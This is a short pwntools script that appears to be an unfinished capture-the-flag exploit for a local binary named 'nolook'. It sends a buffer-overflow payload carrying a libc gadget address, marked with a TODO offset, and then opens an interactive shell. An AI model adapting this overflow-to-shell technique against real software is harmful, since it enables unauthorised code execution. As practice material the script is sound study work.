from pwn import *

r = process('./nolook')
rop_libc = ELF('./libc-2.27.so')

gdb.attach(r, '''
b *0x00400617
''')

rop = 0x4f322 # + TODO offset

# constraint $rsp+40 = NULL

# buffer overflow of 16 bytes
payload = b'A' * 20 + b'B' * 4 + p64(rop) + b'\x00' * 1000
r.sendline(payload)
r.interactive()
